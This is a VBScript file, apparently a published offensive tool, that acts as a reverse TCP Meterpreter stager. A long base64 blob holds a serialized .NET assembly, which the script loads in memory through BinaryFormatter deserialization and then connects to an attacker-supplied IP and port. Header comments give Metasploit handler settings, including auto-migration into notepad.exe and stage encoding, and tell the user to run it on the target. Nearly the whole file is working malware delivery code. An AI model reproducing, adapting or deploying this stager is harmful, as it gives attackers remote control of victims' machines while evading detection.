'____   ______________  _________   _____          __                
'\   \ /   /\______   \/   _____/  /     \   _____/  |_  ___________ 
' \   Y   /  |    |  _/\_____  \  /  \ /  \_/ __ \   __\/ __ \_  __ \
'  \     /   |    |   \/        \/    Y    \  ___/|  | \  ___/|  | \/
'   \___/    |______  /_______  /\____|__  /\___  >__|  \___  >__|   
'                   \/        \/         \/     \/          \/       

'VBScript Reversed TCP Meterpreter Stager - by Cn33liz 2017
'CSharp Meterpreter Stager build by Cn33liz and embedded within VBScript using DotNetToJScript from James Forshaw
'https://github.com/tyranid/DotNetToJScript

'This Stager should run on x86 as well as x64

'Usage:
'Change RHOST and RPORT below to suit your needs:

If WScript.Arguments.Count = 2 Then
 Attacker_ip = WScript.Arguments.Item(0)
 Attacker_port = WScript.Arguments.Item(1)
Else
 Wscript.Echo "Usage: Attacker_ip Attacker_port"
 Wscript.Quit
End If

Dim RHOST: RHOST = Attacker_ip
Dim RPORT: RPORT = Attacker_port

'Start Msfconsole:
'use exploit/multi/handler
'set PAYLOAD windows/x64/meterpreter/reverse_tcp <- When run from x64 version of wscript.exe
'set PAYLOAD windows/meterpreter/reverse_tcp <- When run from x86 version of wscript.exe
'set LHOST 0.0.0.0
'set LPORT 443
'set AutoRunScript post/windows/manage/migrate NAME=notepad.exe
'set EnableUnicodeEncoding true
'set EnableStageEncoding true
'set ExitOnSession false
'exploit -j

'Then run: wscript.exe VBSMeter.vbs on Target

Sub Debug(s)
End Sub
Sub SetVersion
End Sub
Function Base64ToStream(b)
  Dim enc, length, ba, transform, ms
  Set enc = CreateObject("System.Text.ASCIIEncoding")
  length = enc.GetByteCount_2(b)
  Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
  Set ms = CreateObject("System.IO.MemoryStream")
  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
  ms.Position = 0
  Set Base64ToStream = ms
End Function

Sub Run
Dim s, entry_class
s = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"
s = s & "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"
s = s & "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"
s = s & "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"
s = s & "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"
s = s & "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"
s = s & "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"
s = s & "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"
s = s & "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"
s = s & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"
s = s & "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"
s = s & "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"
s = s & "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"
s = s & "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"
s = s & "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"
s = s & "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"
s = s & "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"
s = s & "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"
s = s & "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"
s = s & "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
s = s & "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"
s = s & "ZW1ibHkGFwAAAARMb2FkCg8MAAAAABwAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"
s = s & "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMALPkZWQAAAAAA"
s = s & "AAAA4AAiIAsBMAAAFAAAAAYAAAAAAABmMwAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"
s = s & "AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAFDMA"
s = s & "AE8AAAAAQAAA2AMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAANwxAAAcAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"
s = s & "AAAALnRleHQAAABsEwAAACAAAAAUAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA2AMAAABA"
s = s & "AAAABAAAABYAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAaAAAAAAAAAAAA"
s = s & "AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAEgzAAAAAAAASAAAAAIABQDYIgAABA8AAAEAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzAHAHECAAAB"
s = s & "AAARFgogABAAAAsgACAAAAwfQA1+EAAACiZ+EAAAChMEFhMFfgEAAAQtORIR/hUDAAACIAICAAAS"
s = s & "ESgBAAAGLAIWKtAaAAABKBEAAApyAQAAcB8kbxIAAAqAAgAABBeAAQAABAMSBigTAAAKLQIWKgQW"
s = s & "MggEIP//AAAxAhYqEQYEcxQAAAoTBxEHbxUAAAoTCBgXHH4QAAAKFhYoAwAABhMJEQkVcxYAAAoo"
s = s & "FwAACiwCFiofQBgRB28YAAAKbxkAAAoRB28aAAAKcxsAAAooHAAACn4CAAAEEQhvHQAACnQBAAAb"
s = s & "EwoRCREKEQhvHgAACn4QAAAKfhAAAAp+EAAACn4QAAAKKAQAAAYW/gETCxELLRARCSgGAAAGJigC"
s = s & "AAAGJhYqHigfAAAKEwwRDB4oBwAABhEJEQwaFigFAAAGJhEMKCAAAAooIQAACgoRDCgiAAAKGxMN"
s = s & "KCMAAAoeMwQfChMNBhENWI0mAAABEw4oIwAACh4zEREOFh9InBEOFyC/AAAAnCsJEQ4WIL8AAACc"
s = s & "FxMSEQkoIQAACigkAAAKExMoIwAACh4zAxgTEhYTFysTEQ4RFxESWBETEReRnBEXF1gTFxEXGjLo"
s = s & "BigfAAAKExQRFAYoBwAABhYTFRYTFis8EQkRFAYRFVkWKAUAAAYTFhYTGCsaEQ4RGBENWBEVWBEU"
s = s & "ERgoJQAACpwRGBdYExgRGBEWMuARFREWWBMVERUGMr8RFCgiAAAKBwhgEw9+EAAAChEOjmkRDwko"
s = s & "CAAABhMQEQ4WERARDo5pKCYAAAoWFhEQEQQWEgUoCQAABhUoCgAABiYRCSgGAAAGJigCAAAGJhEL"
s = s & "Kh4CKCcAAAoqAAAAQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBsAAAAJAUAACN+AACQ"
s = s & "BQAA2AYAACNTdHJpbmdzAAAAAGgMAAAUAAAAI1VTAHwMAAAQAAAAI0dVSUQAAACMDAAAeAIAACNC"
s = s & "bG9iAAAAAAAAAAIAAAFXdQIcCQIAAAD6ATMAFgAAAQAAACcAAAADAAAACQAAAAwAAAAkAAAAJwAA"
s = s & "AA8AAAACAAAAAQAAAAEAAAAEAAAAAQAAAAoAAAABAAAAAgAAAAEAAAAAAGcDAQAAAAAABgArAt4E"
s = s & "BgCYAt4EBgBcAZ0EDwD+BAAABgCEAdYDBgAOAtYDBgDvAdYDBgB/AtYDBgBLAtYDBgBkAtYDBgCb"
s = s & "AdYDBgBwAb8EBgA0Ab8EBgC2AdYDBgDHA2QFBgDTAWQFBgBCAccGBgAUBoEDBgD/A9YDCgCMBtkF"
s = s & "CgAHAdkFCgDcANkFCgBGBdkFCgCOBTsGCgBoBjsGCgCuBTsGBgDSAIEDBgCWBIEDBgAmAYEDBgCZ"
s = s & "AIEDBgApBdYDCgBqBjsGCgCqAzsGCgCABTsGCgAdATsGBgCVA8cGBgA8A78EBgC6AoEDBgB/BIED"
s = s & "AAAAAAoAAAAAAAEAAQABABAAcwQAAEkAAQABAAoBEAA1AAAAbQADAA0AEQB9AG4BEQBEBHEBBgD2"
s = s & "A3UBBgCIA3UBBhDoA3gBBhD4BXgBBgDsBXUBBgAAA3UBBgAWBEMAAAAAAIAAkyA5BHsBAQAAAAAA"
s = s & "gACWICgEpAADAAAAAACAAJMgRgaDAQMAAAAAAIAAkyAbBpABCQAAAAAAgACRIIcGnAEQAAAAAACA"
s = s & "AJYgUAaaABQAAAAAAIAAkSCtBqUBFQAAAAAAgACRIEYAqwEXAAAAAACAAJEgXgCzARsAAAAAAIAA"
s = s & "kSAHBr4BIQBQIAAAAACGACYGxAEjAM0iAAAAAIYYjAQGACUAAQABAGsAAgACADMAAQABAJoGAQAC"
s = s & "ABIBAQADAOkAAQAEAAkEAQAFADMEAQAGAF4FAQABAMUAAQACALwFAQADAN0CAQAEAE0EAQAFAFYE"
s = s & "AQAGAC4AAQAHACkAAQABAMUAAQACAGAEAQADAHMGAQAEAFIFAQABAMUAAAABALsDAAACABwDAAAB"
s = s & "AKQFAAACAO8CAAADAPYAAAAEADEGAAABAA0FAAACANECAAADAMoFAAAEAGcEAAAFADYFAAAGAFMA"
s = s & "AQABAKsAAQACALAEAAABABMDAAACAIIGCQCMBAEAEQCMBAYAGQCMBAoAKQCMBBAAMQCMBBAAOQCM"
s = s & "BBAAQQCMBBAASQCMBBAAUQCMBBAAWQCMBBAAYQCMBBUAaQCMBBAAcQCMBBAAgQCMBBoAiQCMBAYA"
s = s & "4QAjBEMA6QCzAEYA6QCJAE0AwQArAVUAyQCMBF0AAQH2AmQA4QCMBAEA4QC7BmkAyQCYBW8AkQAK"
s = s & "A3QAyQB5BngACQGMBHwAIQGSAAYAmQC/AogA0QDIAngAKQEjA5AAKQGSBJUA4QBcBpoAKQEwA58A"
s = s & "4QDIAqQAOQEgBagAKQG2Aq4AKQGoBrQAkQCMBAYAJwB7AHECLgALAMoBLgATANMBLgAbAPIBLgAj"
s = s & "APsBLgArABYCLgAzABYCLgA7ABYCLgBDAPsBLgBLABwCLgBTABYCLgBbABYCLgBjADQCLgBrAF4C"
s = s & "QwBbAGsCCgBmAQwAagEIAAYAxgAgAE8DRANaAwEAjQBiEQMAOQQBAAABBQAoBAIARAEHAEYGAQBA"
s = s & "AQkAGwYBAAABCwCHBgEARAENAFAGAQAAAQ8ArQYDAAABEQBGAAQAAAETAF4ABAAAARUABwYEAASA"
s = s & "AAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAC9AD0AAAAAAAIAAAAAAAAAAAAAAL0AgQMA"
s = s & "AAAAAwACAAAAAAAAa2VybmVsMzIAPE1vZHVsZT4AQ1NoYXJwLU1ldGVycHJldGVyRExMAGdRT1MA"
s = s & "c1FPUwBscFdTQURhdGEAbXNjb3JsaWIAVmlydHVhbEFsbG9jAGxwVGhyZWFkSWQAQ3JlYXRlVGhy"
s = s & "ZWFkAHdWZXJzaW9uUmVxdWVzdGVkAEluaXRpYWxpemVkAEdldEZpZWxkAERlbWFuZABSdW50aW1l"
s = s & "VHlwZUhhbmRsZQBoSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAHNvY2tldEhhbmRsZQBWYWx1ZVR5"
s = s & "cGUAUHJvdG9jb2xUeXBlAHByb3RvY29sVHlwZQBmbEFsbG9jYXRpb25UeXBlAFNvY2tldFR5cGUA"
s = s & "c29ja2V0VHlwZQBUcmFuc3BvcnRUeXBlAFRyeVBhcnNlAEd1aWRBdHRyaWJ1dGUAVW52ZXJpZmlh"
s = s & "YmxlQ29kZUF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUA"
s = s & "QXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJs"
s = s & "eUZpbGVWZXJzaW9uQXR0cmlidXRlAFNlY3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZQBBc3NlbWJs"
s = s & "eUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21w"
s = s & "aWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3Nl"
s = s & "bWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNv"
s = s & "bXBhdGliaWxpdHlBdHRyaWJ1dGUAUmVhZEJ5dGUAR2V0VmFsdWUAZ2V0X1NpemUAZHdTdGFja1Np"
s = s & "emUAc29ja2V0QWRkcmVzc1NpemUAZHdTaXplAFNlcmlhbGl6ZQBpTWF4VWRwRGcAVG9TdHJpbmcA"
s = s & "aXBTdHJpbmcAbGVuZ3RoAEFsbG9jSEdsb2JhbABGcmVlSEdsb2JhbABNYXJzaGFsAFdzMl8zMi5k"
s = s & "bGwAd3MyXzMyLmRsbABrZXJuZWwzMi5kbGwAQ1NoYXJwLU1ldGVycHJldGVyRExMLmRsbABTeXN0"
s = s & "ZW0Ad0hpZ2hWZXJzaW9uAENvZGVBY2Nlc3NQZXJtaXNzaW9uAFNvY2tldFBlcm1pc3Npb24ARGVz"
s = s & "dGluYXRpb24AU2VjdXJpdHlBY3Rpb24AU3lzdGVtLlJlZmxlY3Rpb24Ac3pEZXNjcmlwdGlvbgB3"
s = s & "VmVzdGlvbgBGaWVsZEluZm8AcHJvdG9jb2xJbmZvAGxwVmVuZG9ySW5mbwBaZXJvAFdTQUNsZWFu"
s = s & "dXAAZ3JvdXAAV1NBU3RhcnR1cABtX0J1ZmZlcgBpbkJ1ZmZlcgBvdXRCdWZmZXIAYnVmZmVyAGxw"
s = s & "UGFyYW1ldGVyAE1ldGVyUHJldGVyAEJpdENvbnZlcnRlcgAuY3RvcgBSZWFkSW50UHRyAFN5c3Rl"
s = s & "bS5EaWFnbm9zdGljcwBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2Vydmlj"
s = s & "ZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBscFRocmVh"
s = s & "ZEF0dHJpYnV0ZXMAR2V0Qnl0ZXMAQmluZGluZ0ZsYWdzAGR3Q3JlYXRpb25GbGFncwBTb2NrZXRG"
s = s & "bGFncwBzb2NrZXRGbGFncwBmbGFncwBTeXN0ZW0uU2VjdXJpdHkuUGVybWlzc2lvbnMATmV0d29y"
s = s & "a0FjY2VzcwBJUEFkZHJlc3MAZ2V0X0FkZHJlc3MAbHBBZGRyZXNzAFNvY2tldEFkZHJlc3MAc29j"
s = s & "a2V0QWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBTeXN0ZW0uTmV0LlNvY2tldHMAaU1heFNvY2tldHMA"
s = s & "c3pTeXN0ZW1TdGF0dXMAV2FpdEZvclNpbmdsZU9iamVjdABXU0FDb25uZWN0AE1TRkNvbm5lY3QA"
s = s & "ZmxQcm90ZWN0AFN5c3RlbS5OZXQAV1NBU29ja2V0AGNsb3Nlc29ja2V0AG9wX0V4cGxpY2l0AElQ"
s = s & "RW5kUG9pbnQAY291bnQAZ2V0X1BvcnQAcG9ydAByZWN2AEFkZHJlc3NGYW1pbHkAYWRkcmVzc0Zh"
s = s & "bWlseQBDb3B5AFJ0bFplcm9NZW1vcnkAb3BfRXF1YWxpdHkAU3lzdGVtLlNlY3VyaXR5AAAAEW0A"
s = s & "XwBCAHUAZgBmAGUAcgAAAEPlv29I8QFPll9B+cvVDnIABCABAQgDIAABBSABARERBCABAQ4EIAEB"
s = s & "AgUgAQERPSIHGQgJCQkYCRJhEmUSaRgdBQIYCB0FCRgRDAgdBRgICAgIAgYYBgABEnUReQcgAhJN"
s = s & "DhF9BwACAg4QEmEGIAIBEmEIBCAAEmkFAAICGBgEIAASYQMgAA4DIAAICyAEARGAiRGAjQ4IBCAB"
s = s & "HBwCHQUEAAEYCAQAARgYBAABCBgEAAEBGAMAAAgFAAEdBQgFAAIFGAgIAAQBHQUIGAgIt3pcVhk0"
s = s & "4ImAni4BgIRTeXN0ZW0uU2VjdXJpdHkuUGVybWlzc2lvbnMuU2VjdXJpdHlQZXJtaXNzaW9uQXR0"
s = s & "cmlidXRlLCBtc2NvcmxpYiwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1Ymxp"
s = s & "Y0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkVAVQCEFNraXBWZXJpZmljYXRpb24BAxeBAQMXgIEC"
s = s & "BgIDBhJNAgYGAgYOBwACCAYQEQwMAAYYEVERVRFZGAkICwAHCBgdBQgYGBgYCAAECBgYCBFdBQAC"
s = s & "ARgIBwAEGBgJCQkKAAYYCQkYGAkQCQUAAgkYCQUgAgIOCAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5v"
s = s & "bkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAaAQAVQ1NoYXJwLU1ldGVycHJldGVyRExMAAAFAQAA"
s = s & "AAAXAQASQ29weXJpZ2h0IMKpICAyMDE3AAApAQAkMDY2NjljNmUtYmJmMy00NmFiLThjNmUtNDM2"
s = s & "MmQwYmFiZTRhAAAMAQAHMS4wLjAuMAAABQEAAQAABAEAAAAAAAAAAAAs+RlZAAAAAAIAAAAcAQAA"
s = s & "+DEAAPgTAABSU0RTNsEXk8ZvY0GKVEsGxKoSfAEAAABDOlxEZXZlbG9wbWVudFxDU2hhcnAtTWV0"
s = s & "ZXJwcmV0ZXJETExcQ1NoYXJwLU1ldGVycHJldGVyRExMXG9ialxSZWxlYXNlXENTaGFycC1NZXRl"
s = s & "cnByZXRlckRMTC5wZGIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAADwzAAAAAAAAAAAAAFYzAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIMwAAAAAAAAAA"
s = s & "AAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEA"
s = s & "AAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAHwDAAAAAAAAAAAAAHwDNAAAAFYAUwBf"
s = s & "AFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAA"
s = s & "AAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAk"
s = s & "AAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsATcAgAAAQBTAHQAcgBpAG4AZwBGAGkA"
s = s & "bABlAEkAbgBmAG8AAAC4AgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0"
s = s & "AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAVAAWAAEARgBpAGwA"
s = s & "ZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEMAUwBoAGEAcgBwAC0ATQBlAHQAZQByAHAAcgBl"
s = s & "AHQAZQByAEQATABMAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAA"
s = s & "LgAwAAAAVAAaAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABDAFMAaABhAHIAcAAtAE0AZQB0"
s = s & "AGUAcgBwAHIAZQB0AGUAcgBEAEwATAAuAGQAbABsAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkA"
s = s & "cgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMQA3AAAAKgABAAEATABl"
s = s & "AGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABcABoAAQBPAHIAaQBnAGkAbgBhAGwA"
s = s & "RgBpAGwAZQBuAGEAbQBlAAAAQwBTAGgAYQByAHAALQBNAGUAdABlAHIAcAByAGUAdABlAHIARABM"
s = s & "AEwALgBkAGwAbAAAAEwAFgABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAQwBTAGgAYQByAHAA"
s = s & "LQBNAGUAdABlAHIAcAByAGUAdABlAHIARABMAEwAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQBy"
s = s & "AHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIA"
s = s & "cwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAwAAAMAAAAaDMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxlY3Rp"
s = s & "b24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL"
entry_class = "MeterPreter"

Dim fmt, al, d, o
Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
Set al = CreateObject("System.Collections.ArrayList")
al.Add fmt.SurrogateSelector

Set d = fmt.Deserialize_2(Base64ToStream(s))
Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
o.MSFConnect RHOST, RPORT
End Sub

SetVersion
On Error Resume Next
Run
If Err.Number <> 0 Then
  Debug Err.Description
  Err.Clear
End If